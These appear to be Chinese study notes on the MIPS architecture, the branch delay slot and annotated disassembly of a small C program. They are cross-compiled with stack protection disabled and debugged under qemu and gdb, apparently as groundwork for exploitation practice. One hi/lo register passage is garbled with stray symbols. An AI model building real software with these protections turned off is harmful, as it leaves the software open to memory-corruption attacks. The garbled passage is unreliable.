+$24-$25: t8 和 t9，临时寄存器，类似于t0到t7。<br>
+$26-$27: k0 和 k1，保留给内核使用。<br>
+$28: gp，全局指针。<br>
+$29: sp，栈指针。<br>
+$30: fp，帧指针。<br>
+$31: ra，返回地址寄存器，用于存储函数调用的返回地址。<br>
+3. 指令集<br>
+MIPS指令集主要包括以下几类指令：</p>
+<p class="source-line" data-source-line="30">R型指令：用于寄存器间的运算，如加法（add）、减法（sub）、与（and）等。<br>
+I型指令：用于立即数操作和内存访问，如加载（lw）、存储（sw）、跳转（beq）等。<br>
+J型指令：用于无条件跳转，如跳转（j）等。<br>
+4. 内存和地址<br>
+MIPS采用字节寻址，每个地址指向一个字节，但大多数操作都是以字（4字节）为单位进行的。MIPS内存分为几个部分：</p>
+<p class="source-line" data-source-line="36">指令内存：存放程序指令。<br>
+数据内存：存放程序数据。<br>
+5. 调用约定<br>
+在MIPS中，函数调用的标准过程包括保存和恢复寄存器的状态。一般情况下，a0到a3用于传递参数，v0和v1用于返回值，ra保存返回地址，sp用于管理栈空间等。</p>
+<p class="source-line" data-source-line="41">这些是MIPS CUP架构和寄存器的一些基本知识点。MIPS架构设计简单、易于教学和理解，是学习计算机系统基础知识的一个很好的工具。</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="43">sudo apt-get install gcc-mips-linux-gnu g++-mips-linux-gnu
+mips-linux-gnu-gcc -msoft-float -fno-stack-protector -o example example.c
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>
+<h3 id="mips分支延迟槽" class="source-line" data-source-line="47">Mips分支延迟槽<a class="vx-header-anchor" href="#mips分支延迟槽" vx-data-anchor-icon="¶"></a></h3>
+<p class="source-line" data-source-line="48">原文链接：<a href="https://blog.csdn.net/orz365/article/details/9236027?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-11.control&amp;dist_request_id=1328602.71242.16152755380561503&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-11.control">分支延迟槽</a></p>
+<ol>
+<li class="source-line" data-source-line="49">概述</li>
+</ol>
+<p class="source-line" data-source-line="51">分支延迟槽 (Branch delay slot)，简单地说就是位于分支指令后面的一条指令，不管分支发生与否其总是被执行，而且位于分支延迟槽中的指令先于分支指令提交 (commit)。</p>
+<p class="source-line" data-source-line="53">看这个代码片段 (MIPS Linux kernel 2.6.17)：</p>
+<p class="source-line" data-source-line="55">801ea9d4:     02202021     move   a0,s1<br>
+801ea9d8:     27a50014     addiu   a1,sp,20<br>
+801ea9dc:     0c0ce551     jal   80339544 &lt;pcibios_resource_to_bus&gt;<br>
+801ea9e0:     02403021     move   a2,s2<br>
+801ea9e4:     8e240010     lw     a0,16(s1)<br>
+...</p>
+<p class="source-line" data-source-line="62">MIPS ABI 规定，a0, a1, a2, a3 用于过程调用的前四个参数，则 move a2, s2 是置第 3 个参数，但是其位于函数调用指令 jal 80339544（分支指令）之后，这个 move a2, s2 所在地即为一个分支延迟槽。<br>
+分支延迟槽在 DSP 和历史较悠久的 RISC 上比较常见，如 MIPS,  SPARC 等。PowerPC 和 ARM 上则没有这个概念。x86 亦没有。</p>
+<ol start="2">
+<li class="source-line" data-source-line="65">缘起</li>
+</ol>
+<p class="source-line" data-source-line="67">引入分支延迟槽的目的主要是为了提高流水线的效率。</p>
+<p class="source-line" data-source-line="69">流水线中，分支指令执行时因为确定下一条指令的目标地址（紧随其后 or 跳转目标处？）一般要到第 2 级以后，在目标确定前流水线的取指级是不能工作的，即整个流水线就“浪费”（阻塞）了一个时间片，为了利用这个时间片，在体系结构的层面上规定跳转指令后面的一个时间片为分支延迟槽（branch delay slot）。位于分支延迟槽中的指令总是被执行，与分支发生与否没有关系。这样就有效利用了一个时间片，消除了流水线的一个“气泡”。</p>
+<p class="source-line" data-source-line="71">这种技术手段主要用在早期没有分支预测的流水线 RISC 上，现代 RISC 实现早就可以在流水线的第 2 级利用分支预测确定跳转的目标，分支延迟槽也就失去了原来的价值，但为了软件上的兼容性 MIPS 和 SPARC 还是作了保留。</p>
+<p class="source-line" data-source-line="73">分支延迟槽适用的指令类型<br>
+在 MIPS 架构中，以下类型的指令都涉及分支延迟槽：</p>
+<p class="source-line" data-source-line="76">跳转指令：</p>
+<p class="source-line" data-source-line="78">jal（Jump and Link）：跳转到指定地址，并保存返回地址到 $ra 寄存器。<br>
+jalr（Jump and Link Register）：跳转到 $t9 寄存器指定的地址，并保存返回地址到 $ra 寄存器。<br>
+条件分支指令：</p>
+<p class="source-line" data-source-line="82">beq（Branch if Equal）：如果两个寄存器的值相等，则跳转到指定的目标地址。<br>
+bne（Branch if Not Equal）：如果两个寄存器的值不相等，则跳转到指定的目标地址。<br>
+blez（Branch if Less Than or Equal to Zero）：如果寄存器的值小于或等于零，则跳转。<br>
+bgtz（Branch if Greater Than Zero）：如果寄存器的值大于零，则跳转。<br>
+bltz（Branch if Less Than Zero）：如果寄存器的值小于零，则跳转。<br>
+bgez（Branch if Greater Than or Equal to Zero）：如果寄存器的值大于或等于零，则跳转。<br>
+分支延迟槽机制的作用<br>
+分支延迟槽机制的作用是尽可能减少由于分支或跳转指令造成的流水线停顿。在没有现代分支预测技术的早期处理器中，分支延迟槽帮助保持流水线的高效运行。</p>
+<p class="source-line" data-source-line="91">分支延迟槽如何工作<br>
+指令顺序：分支指令之后的一条指令（即分支延迟槽中的指令）无论分支是否发生，都将被执行。这种设计消除了由于分支指令的目标地址未确定而导致的流水线停顿。</p>
+<p class="source-line" data-source-line="94">延迟槽指令的选择：编译器或程序员通常会在分支延迟槽中插入一条有用的指令（而非空操作或无用指令），以最大化分支延迟槽的利用效率。</p>
+<p class="source-line" data-source-line="96">现代处理器与分支延迟槽<br>
+现代处理器（包括 MIPS 处理器）大多使用分支预测技术来减少或消除分支延迟槽的需求。分支预测可以提前猜测分支的结果，从而减少因跳转引起的流水线停顿。因此，尽管分支延迟槽机制在早期 RISC 架构中非常重要，但在现代处理器中，它的作用已被分支预测和其他优化技术取代。</p>
+<p class="source-line" data-source-line="99">总结来说，MIPS 架构中的分支延迟槽机制不仅适用于 jalr 指令，也适用于所有分支和跳转指令。这个机制旨在通过确保跳转指令后的紧接一条指令被执行，来减少流水线停顿。</p>
+<h3 id="一些指令" class="source-line" data-source-line="100">一些指令<a class="vx-header-anchor" href="#一些指令" vx-data-anchor-icon="¶"></a></h3>
+<p class="source-line" data-source-line="102">单精度浮点数加载和存储</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="103">lui     $v0, 0x40  # '@'
+lwc1    $f0, flt_400A04
+swc1    $f0, 0x30+var_C($fp) # var_C = 
+1. lui $v0, 0x40
+作用：将立即数 0x40 加载到寄存器 $v0 的高16位。
+结果：$v0 变成 0x40000000。
+2. lwc1 $f0, flt_400A04
+作用：将内存地址 flt_400A04 中的32位单精度浮点数加载到浮点寄存器 $f0 中。
+前提：此时假定 flt_400A04 是一个定义在全局数据段的符号，对应的实际地址是 0x400A04。
+3. swc1 $f0, 0x30+var_C($fp)
+作用：将浮点寄存器 $f0 中的单精度浮点数存储到内存地址 0x30+var_C($fp) 中。
+结果：将浮点数存储到当前栈帧的 var_C 偏移处
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="117">双精度浮点数加载和存储</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="118">lui     $v0, 0x40  # '@'
+ldc1    $f0, dbl_400A08
+sdc1    $f0, 0x30+var_8($fp) # var_8 = dbl_400A08
+
+1. lui $v0, 0x40
+作用：同上，将立即数 0x40 加载到寄存器 $v0 的高16位。
+结果：$v0 变成 0x40000000。
+2. ldc1 $f0, dbl_400A08
+作用：将内存地址 dbl_400A08 中的64位双精度浮点数加载到浮点寄存器对（$f0 和 $f1）中。
+前提：此时假定 dbl_400A08 是一个定义在全局数据段的符号，对应的实际地址是 0x400A08。
+3. sdc1 $f0, 0x30+var_8($fp)
+作用：将浮点寄存器 $f0 和 $f1 中的双精度浮点数存储到内存地址 0x30+var_8($fp) 中。
+结果：将双精度浮点数存储到当前栈帧的 var_8 偏移处。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="134">mips-linux-gnu-gcc -o 20240708 20240708.c</p>
+<h5 id="01homework" class="source-line" data-source-line="137">01homework<a class="vx-header-anchor" href="#01homework" vx-data-anchor-icon="¶"></a></h5>
+<ul>
+<li class="source-line" data-source-line="138">三种字符类型，整型，字符串，浮点</li>
+<li class="source-line" data-source-line="139">算术，逻辑，位</li>
+<li class="source-line" data-source-line="140">动态编译</li>
+<li class="source-line" data-source-line="141">大端序</li>
+<li class="source-line" data-source-line="142">固定基地址</li>
+<li class="source-line" data-source-line="143">关闭堆栈保护</li>
+</ul>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="145">mips-linux-gnu-gcc -static -fno-stack-protector -Wl,-z,notext 20240709_homework.c -o 20240709_homework
+qemu-mips -g 2345 ./20240709_homework
+gdb-multiarch 20240709_homework
+set arch mips
+set endian big   
+#小端为little
+target remote localhost:2345
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="155">mips-linux-gnu-gcc -fno-stack-protector -Wl,-z,notext test.c -o test
+qemu-mips -L /usr/mips-linux-gnu ./test
+#安装pwndbg
+sudo apt install gdb-multiarch
+#尝试动态调试
+qemu-mips -L /usr/mips-linux-gnu -g 2345 ./test
+gdb-multiarch test
+set arch mips
+set endian big
+target remote localhost:2345
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="168">#include &lt;stdio.h&gt;
+
+// 函数声明
+void arithmetic_operations();
+void logical_operations();
+void bitwise_operations();
+
+// 全局变量声明
+int global_int_var = 10;
+float global_float_var = 3.14;
+char global_string_var[] = "Hello, MIPS!";
+
+// 主函数
+int main() {
+    // 调用各种类型函数
+    arithmetic_operations();
+    logical_operations();
+    bitwise_operations();
+    
+    return 0;
+}
+
+// 算术运算函数
+void arithmetic_operations() {
+    int a = 20;
+    int b = 7;
+    int result_add = a + b;
+    int result_sub = a - b;
+    int result_mul = a * b;
+    int result_div = a / b;
+    int result_mod = a % b;
+
+    printf("Arithmetic Operations:\n");
+    printf("Addition: %d\n", result_add);
+    printf("Subtraction: %d\n", result_sub);
+    printf("Multiplication: %d\n", result_mul);
+    printf("Division: %d\n", result_div);
+    printf("Modulus: %d\n", result_mod);
+}
+
+// 逻辑运算函数
+void logical_operations() {
+    int x = 5;
+    int y = 3;
+    int result_and = x &amp; y;
+    int result_or = x | y;
+    int result_xor = x ^ y;
+    int result_not_x = ~x;
+
+    printf("\nLogical Operations:\n");
+    printf("AND: %d\n", result_and);
+    printf("OR: %d\n", result_or);
+    printf("XOR: %d\n", result_xor);
+    printf("NOT x: %d\n", result_not_x);
+}
+
+// 位运算函数
+void bitwise_operations() {
+    int m = 12;
+    int n = 5;
+    int result_shift_left = m &lt;&lt; 2;
+    int result_shift_right = m &gt;&gt; 1;
+
+    printf("\nBitwise Operations:\n");
+    printf("Shift Left: %d\n", result_shift_left);
+    printf("Shift Right: %d\n", result_shift_right);
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<h6 id="mips汇编查看" class="source-line" data-source-line="238">mips汇编查看<a class="vx-header-anchor" href="#mips汇编查看" vx-data-anchor-icon="¶"></a></h6>
+<p class="source-line" data-source-line="239">arithmetic_operations</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="240">栈帧设置
+addiu   $sp, -0x40
+sw      $ra, 0x38+var_s4($sp)
+sw      $fp, 0x38+var_s0($sp)
+move    $fp, $sp
+li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)
+sw      $gp, 0x38+var_28($sp)
+#addiu   $sp, -0x40：分配 64 字节的栈空间。
+#sw      $ra, 0x38+var_s4($sp)：保存返回地址 $ra。
+#sw      $fp, 0x38+var_s0($sp)：保存旧的帧指针 $fp。
+#move    $fp, $sp：设置新的帧指针。
+#li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)：加载全局偏移表的值。
+#sw      $gp, 0x38+var_28($sp)：保存 $gp 的值。
+初始化变量
+li      $v0, 0x14
+sw      $v0, 0x38+var_a($fp)
+li      $v0, 7
+sw      $v0, 0x38+var_b($fp)
+#li      $v0, 0x14：将常数 20 加载到 $v0。
+#sw      $v0, 0x38+var_a($fp)：将 20 存储到 var_a。
+#li      $v0, 7：将常数 7 加载到 $v0。
+#sw      $v0, 0x38+var_b($fp)：将 7 存储到 var_b。
+加法操作
+lw      $v1, 0x38+var_a($fp)
+lw      $v0, 0x38+var_b($fp)
+addu    $v0, $v1, $v0
+sw      $v0, 0x38+var_Add_a_b($fp)
+#lw      $v1, 0x38+var_a($fp)：将 var_a 的值加载到 $v1。
+#lw      $v0, 0x38+var_b($fp)：将 var_b 的值加载到 $v0。
+#addu    $v0, $v1, $v0：将 $v1 和 $v0 相加，结果存储在 $v0。
+#sw      $v0, 0x38+var_Add_a_b($fp)：将加法结果存储到 var_Add_a_b。
+减法操作
+lw      $v1, 0x38+var_a($fp)
+lw      $v0, 0x38+var_b($fp)
+subu    $v0, $v1, $v0
+sw      $v0, 0x38+var_Sub_a_b($fp)
+#lw      $v1, 0x38+var_a($fp)：将 var_a 的值加载到 $v1。
+#lw      $v0, 0x38+var_b($fp)：将 var_b 的值加载到 $v0。
+#subu    $v0, $v1, $v0：将 $v1 减去 $v0，结果存储在 $v0。
+#sw      $v0, 0x38+var_Sub_a_b($fp)：将减法结果存储到 var_Sub_a_b。
+乘法操作
+lw      $v1, 0x38+var_a($fp)
+lw      $v0, 0x38+var_b($fp)
+mul     $v0, $v1, $v0
+sw      $v0, 0x38+var_10($fp)
+#lw      $v1, 0x38+var_a($fp)：将 var_a 的值加载到 $v1。
+#lw      $v0, 0x38+var_b($fp)：将 var_b 的值加载到 $v0。
+#mul     $v0, $v1, $v0：将 $v1 和 $v0 相乘，结果存储在 $v0。
+#sw      $v0, 0x38+var_10($fp)：将乘法结果存储到 var_10。
+除法操作
+lw      $v1, 0x38+var_a($fp)
+lw      $v0, 0x38+var_b($fp)
+teq     $v0, $zero  #7
+div     $v1, $v0
+mfhi    $v0
+mflo    $v0
+sw      $v0, 0x38+var_C($fp)
+#lw      $v1, 0x38+var_a($fp)：将 var_a 的值加载到 $v1。
+#lw      $v0, 0x38+var_b($fp)：将 var_b 的值加载到 $v0。
+#teq     $v0, $zero  #7：检查 $v0 是否为零。
+#div     $v1, $v0：将 $v1 除以 $v0，商存储在 $lo，余数存储在 $hi。
+#mfhi    $v0：将余数从 $hi 加载到 $v0。
+#mflo    $v0：将商从 $lo 加载到 $v0。
+#sw      $v0, 0x38+var_C($fp)：将除法结果存储到 var_C。
+取模操作
+lw      $v1, 0x38+var_a($fp)
+lw      $v0, 0x38+var_b($fp)
+teq     $v0, $zero  #7
+div     $v1, $v0
+mfhi    $v0
+sw      $v0, 0x38+var_8($fp)
+#lw      $v1, 0x38+var_a($fp)：将 var_a 的值加载到 $v1。
+#lw      $v0, 0x38+var_b($fp)：将 var_b 的值加载到 $v0。
+#teq     $v0, $zero  #7：检查 $v0 是否为零。
+#div     $v1, $v0：将 $v1 除以 $v0，商存储在 $lo，余数存储在 $hi。
+#mfhi    $v0：将余数从 $hi 加载到 $v0。
+#sw      $v0, 0x38+var_8($fp)：将余数结果存储到 var_8。
+打印结果
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aArithmeticOper - 0x400000)  # "Arithmetic Operations:"
+la      $v0, puts
+move    $t9, $v0
+jalr    $t9 ; puts
+nop
+#lui     $v0, 0x40  # '@'：加载高位立即数。
+#addiu   $a0, $v0, (aArithmeticOper - 0x400000)：设置字符串 "Arithmetic Operations:" 的地址。
+#la      $v0, puts：加载 puts 函数的地址。
+#move    $t9, $v0：将 puts 地址移动到 $t9。
+#jalr    $t9 ; puts：调用 puts 函数。
+后续代码类似，都是将结果通过 printf 打印出来：
+
+lw      $gp, 0x38+var_28($fp)
+lw      $a1, 0x38+var_Add_a_b($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aAdditionD - 0x400000)  # "Addition: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+加载并打印加法结果。
+类似地，减法、乘法、除法和取模结果也依次打印出来。
+恢复栈帧并返回
+move    $sp, $fp
+lw      $ra, 0x38+var_s4($sp)
+lw      $fp, 0x38+var_s0($sp)
+addiu   $sp, 0x40
+jr      $ra
+nop
+#move    $sp, $fp：恢复栈指针。
+#lw      $ra, 0x38+var_s4($sp)：恢复返回地址。
+#lw      $fp, 0x38+var_s0($sp)：恢复帧指针。
+#addiu   $sp, 0x40：释放栈空间。
+#jr      $ra：返回到调用者。
+#nop：无操作。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="356">小计：</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="357">在 MIPS 汇编中，hi 和 lo 是专门用来存储除法操作结果的寄存器。
+
+**
+ℎ𝑖寄存器
+∗∗
+hi寄存器∗：
+
+$hi 寄存器用来存储除法操作的余数（remainder）。在执行除法指令（如 div）后，余数会被存储在 $hi 中。当使用 mfhi $v0 指令时，可以将 $hi 中的值加载到 $v0 寄存器中。
+**
+𝑙𝑜寄存器
+∗∗
+lo寄存器：
+
+$lo 寄存器用来存储除法操作的商（quotient）。类似地，执行除法指令后，商会存储在 $lo 寄存器中。通过 mflo $v0 指令，可以将 $lo 中的值加载到 $v0 寄存器中。
+这两个寄存器的设计是为了方便处理除法操作的结果，因为除法通常会产生两个结果：商和余数。MIPS 指令集将这些结果分别存储在 $lo 和 $hi 寄存器中，以便程序能够轻松访问和处理这些数据。
+
+总结一下：
+
+$hi 寄存器存储除法操作的余数。
+$lo 寄存器存储除法操作的商。
+在进行除法操作后，通常会使用 mfhi 和 mflo 指令来将这些结果加载到其他寄存器中，以便程序后续处理或存储。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="380">logical_operations</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="381">栈帧设置
+addiu   $sp, -0x38
+sw      $ra, 0x30+var_s4($sp)
+sw      $fp, 0x30+var_s0($sp)
+move    $fp, $sp
+li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)
+sw      $gp, 0x30+var_20($sp)
+#addiu   $sp, -0x38：分配 56 字节的栈空间。
+#sw      $ra, 0x30+var_s4($sp)：保存返回地址 $ra。
+#sw      $fp, 0x30+var_s0($sp)：保存旧的帧指针 $fp。
+#move    $fp, $sp：设置新的帧指针。
+#li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)：加载全局偏移表的值。
+#sw      $gp, 0x30+var_20($sp)：保存 $gp 的值。
+初始化变量
+li      $v0, 5
+sw      $v0, 0x30+var_18($fp)
+li      $v0, 3
+sw      $v0, 0x30+var_14($fp)
+#li      $v0, 5：将常数 5 加载到 $v0。
+#sw      $v0, 0x30+var_18($fp)：将 5 存储到 var_18。
+#li      $v0, 3：将常数 3 加载到 $v0。
+#sw      $v0, 0x30+var_14($fp)：将 3 存储到 var_14。
+逻辑操作
+AND 操作
+lw      $v1, 0x30+var_18($fp)
+lw      $v0, 0x30+var_14($fp)
+and     $v0, $v1, $v0
+sw      $v0, 0x30+var_10($fp)
+#lw      $v1, 0x30+var_18($fp)：将 var_18 的值加载到 $v1。
+#lw      $v0, 0x30+var_14($fp)：将 var_14 的值加载到 $v0。
+#and     $v0, $v1, $v0：将 $v1 和 $v0 做按位与操作，结果存储在 $v0。
+#sw      $v0, 0x30+var_10($fp)：将 AND 操作结果存储到 var_10。
+OR 操作
+lw      $v1, 0x30+var_18($fp)
+lw      $v0, 0x30+var_14($fp)
+or      $v0, $v1, $v0
+sw      $v0, 0x30+var_C($fp)
+#lw      $v1, 0x30+var_18($fp)：将 var_18 的值加载到 $v1。
+#lw      $v0, 0x30+var_14($fp)：将 var_14 的值加载到 $v0。
+#or      $v0, $v1, $v0：将 $v1 和 $v0 做按位或操作，结果存储在 $v0。
+#sw      $v0, 0x30+var_C($fp)：将 OR 操作结果存储到 var_C。
+XOR 操作
+lw      $v1, 0x30+var_18($fp)
+lw      $v0, 0x30+var_14($fp)
+xor     $v0, $v1, $v0
+sw      $v0, 0x30+var_8($fp)
+#lw      $v1, 0x30+var_18($fp)：将 var_18 的值加载到 $v1。
+#lw      $v0, 0x30+var_14($fp)：将 var_14 的值加载到 $v0。
+#xor     $v0, $v1, $v0：将 $v1 和 $v0 做按位异或操作，结果存储在 $v0。
+#sw      $v0, 0x30+var_8($fp)：将 XOR 操作结果存储到 var_8。
+NOR 操作
+lw      $v0, 0x30+var_18($fp)
+nor     $v0, $zero, $v0
+sw      $v0, 0x30+var_4($fp)
+#lw      $v0, 0x30+var_18($fp)：将 var_18 的值加载到 $v0。
+#nor     $v0, $zero, $v0：将 $v0 做按位取反操作，结果存储在 $v0。
+#sw      $v0, 0x30+var_4($fp)：将 NOR 操作结果存储到 var_4。
+打印结果
+打印标题
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aLogicalOperati - 0x400000)  # "\nLogical Operations:"
+la      $v0, puts
+move    $t9, $v0
+jalr    $t9 ; puts
+nop
+#lui     $v0, 0x40：加载高位立即数。
+#addiu   $a0, $v0, (aLogicalOperati - 0x400000)：设置字符串 "\nLogical Operations:" 的地址。
+#la      $v0, puts：加载 puts 函数的地址。
+#move    $t9, $v0：将 puts 地址移动到 $t9。
+#jalr    $t9 ; puts：调用 puts 函数。
+打印 AND 操作结果
+lw      $gp, 0x30+var_20($fp)
+lw      $a1, 0x30+var_10($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aAndD - 0x400000)  # "AND: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+#lw      $gp, 0x30+var_20($fp)：恢复 $gp。
+#lw      $a1, 0x30+var_10($fp)：加载 AND 操作结果到 $a1。
+#lui     $v0, 0x40：加载高位立即数。
+#addiu   $a0, $v0, (aAndD - 0x400000)：设置字符串 "AND: %d\n" 的地址。
+#la      $v0, printf：加载 printf 函数的地址。
+#move    $t9, $v0：将 printf 地址移动到 $t9。
+#jalr    $t9 ; printf：调用 printf 函数。
+后续代码类似，依次打印 OR、XOR 和 NOT 操作的结果：
+
+lw      $gp, 0x30+var_20($fp)
+lw      $a1, 0x30+var_C($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aOrD - 0x400000)  # "OR: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+
+lw      $gp, 0x30+var_20($fp)
+lw      $a1, 0x30+var_8($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aXorD - 0x400000)  # "XOR: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+
+lw      $gp, 0x30+var_20($fp)
+lw      $a1, 0x30+var_4($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aNotXD - 0x400000)  # "NOT x: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+恢复栈帧并返回
+lw      $gp, 0x30+var_20($fp)
+nop
+move    $sp, $fp
+lw      $ra, 0x30+var_s4($sp)
+lw      $fp, 0x30+var_s0($sp)
+addiu   $sp, 0x38
+jr      $ra
+nop
+#lw      $gp, 0x30+var_20($fp)：恢复 $gp。
+#move    $sp, $fp：恢复栈指针。
+#lw      $ra, 0x30+var_s4($sp)：恢复返回地址。
+#lw      $fp, 0x30+var_s0($sp)：恢复帧指针。
+#addiu   $sp, 0x38：释放栈空间。
+#jr      $ra：返回到调用者。
+#nop：无操作。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="514">bitwise_operations</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="515">栈帧设置
+addiu   $sp, -0x30
+sw      $ra, 0x28+var_s4($sp)
+sw      $fp, 0x28+var_s0($sp)
+move    $fp, $sp
+li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)
+sw      $gp, 0x28+var_18($sp)
+#addiu   $sp, -0x30：分配 48 字节的栈空间。
+#sw      $ra, 0x28+var_s4($sp)：保存返回地址 $ra。
+#sw      $fp, 0x28+var_s0($sp)：保存旧的帧指针 $fp。
+#move    $fp, $sp：设置新的帧指针。
+#li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)：加载全局偏移表的值。
+#sw      $gp, 0x28+var_18($sp)：保存 $gp 的值到 var_18。
+初始化变量
+li      $v0, 0xC
+sw      $v0, 0x28+var_10($fp)
+li      $v0, 5
+sw      $v0, 0x28+var_C($fp)
+#li      $v0, 0xC：将常数 12 加载到 $v0。
+#sw      $v0, 0x28+var_10($fp)：将 12 存储到 var_10。
+#li      $v0, 5：将常数 5 加载到 $v0。
+#sw      $v0, 0x28+var_C($fp)：将 5 存储到 var_C。
+位操作：左移和右移
+左移操作
+lw      $v0, 0x28+var_10($fp)
+sll     $v0, 2
+sw      $v0, 0x28+var_8($fp)
+#lw      $v0, 0x28+var_10($fp)：将 var_10 的值加载到 $v0。
+#sll     $v0, 2：将 $v0 向左移动 2 位（相当于乘以 4）。
+#sw      $v0, 0x28+var_8($fp)：将左移操作结果存储到 var_8。
+右移操作
+lw      $v0, 0x28+var_10($fp)
+sra     $v0, 1
+sw      $v0, 0x28+var_4($fp)
+#lw      $v0, 0x28+var_10($fp)：将 var_10 的值加载到 $v0。
+#sra     $v0, 1：将 $v0 向右算术移动 1 位（符号位扩展）。
+#sw      $v0, 0x28+var_4($fp)：将右移操作结果存储到 var_4。
+打印结果
+打印标题
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aBitwiseOperati - 0x400000)  # "\nBitwise Operations:"
+la      $v0, puts
+move    $t9, $v0
+jalr    $t9 ; puts
+nop
+#lui     $v0, 0x40：加载高位立即数。
+#addiu   $a0, $v0, (aBitwiseOperati - 0x400000)：设置字符串 "\nBitwise Operations:" 的地址。
+#la      $v0, puts：加载 puts 函数的地址。
+#move    $t9, $v0：将 puts 地址移动到 $t9。
+#jalr    $t9 ; puts：调用 puts 函数。
+打印左移操作结果
+lw      $gp, 0x28+var_18($fp)
